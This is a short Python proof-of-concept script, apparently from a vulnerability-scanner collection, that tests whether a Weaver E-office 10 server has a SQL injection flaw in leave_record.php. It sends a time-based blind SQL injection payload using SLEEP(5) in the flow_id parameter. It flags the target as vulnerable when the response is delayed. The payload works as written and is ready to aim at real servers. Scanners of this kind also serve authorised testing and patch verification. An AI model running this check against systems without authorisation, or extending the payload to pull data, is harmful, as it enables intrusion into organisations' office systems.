import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-office-10接口leave_record.php存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code not in range(400, 499) and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult